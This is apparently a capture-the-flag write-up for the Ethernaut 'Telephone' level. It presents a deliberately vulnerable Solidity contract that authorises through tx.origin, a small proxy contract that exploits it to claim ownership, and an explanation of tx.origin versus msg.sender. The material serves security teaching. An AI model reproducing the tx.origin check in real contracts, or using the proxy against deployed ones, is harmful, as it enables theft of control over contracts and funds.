## Challenge
~~~
Claim ownership of the contract below to complete this level.

  Things that might help

- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
`

## Solution

```
contract Proxy {
    Telephone  targetTelephone;

    constructor(address _target) {
        targetTelephone = Telephone(_target);
    }
  
    function getOwnership() external {
        targetTelephone.changeOwner(msg.sender);
    }
}
```

## Key takeaways and useful resources

`tx.origin` and `msg.sender` can have different values based on the context - `tx.origin` will always remain the same during nested calls in a transaction, but the `msg.sender` is changed for every nested call.
Example:
Lets say we have an externally owned account (EOA), contract A and contract B.We make a transaction initiated by the EOA to contract A which itself makes a call to contract B.
EOA -> contract A -> contract 

For contract A we would have:
`tx.origin` = address of EOA
`msg.sender` = address of EOA

For contract B we would have:
`tx.origin` = address of EOA
`msg.sender` = address of contract A


[Stack exchange answer](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)
